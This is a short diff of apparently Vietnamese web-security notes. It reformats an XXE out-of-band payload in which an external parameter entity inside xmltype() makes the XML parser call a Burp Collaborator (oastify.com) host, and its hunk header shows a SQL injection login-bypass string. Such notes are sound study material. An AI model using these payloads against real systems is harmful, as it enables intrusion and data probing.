@@ -1256,14 +1256,14 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
   Trong phần XML trong xmltype():
 
   ```xml
-  <?xml version="1.0" encoding="UTF-8"?>
+  '<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE root [
     <!ENTITY % remote SYSTEM "http%3a//020rrkh96d67mk3er0uxclezdqjh7avz.oastify.com">
     %remote;
-  ]>
+  ]>'
   ```
 
-  *<!ENTITY % remote SYSTEM "020rrkh96d67mk3er0uxclezdqjh7avz.oastify.com">* định nghĩa entity %remote trỏ đến một domain Burp.
+  ```<!ENTITY % remote SYSTEM "020rrkh96d67mk3er0uxclezdqjh7avz.oastify.com">``` định nghĩa entity %remote trỏ đến một domain Burp.
 
   %remote; sẽ khiến trình phân tích XML parser thực hiện HTTP request đến domain Burp để lấy nội dung từ đó.
 
